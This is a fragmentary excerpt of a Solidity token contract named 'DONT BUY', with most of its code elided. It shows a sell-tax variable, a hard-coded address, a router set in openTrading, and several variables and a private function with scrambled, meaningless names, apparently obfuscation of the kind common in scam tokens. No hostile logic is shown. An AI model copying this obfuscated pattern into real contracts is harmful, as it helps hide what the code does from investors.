...
pragma solidity 0.8.18;
    ...
    string private constant _name = unicode"DONT BUY";
    ...
    uint256 private _reduceSellTax6At=20;
    uint256 private _swpwpasruir=0;
    uint256 private _yeqxrtop=0;
    address public  _uacgvuksrq = 0xa820Db84882F7cf7C26B93539bAeED237cAB9926;
   ...
   function rqkpiyuve(address account) private view returns (bool) {
    ...
    function openTrading() external onlyOwner() {
        ...
        _unisV2Routers = IUniswapV2sRouters (0x10ED43C718714eb63d5aA57B78B54704E256024E);
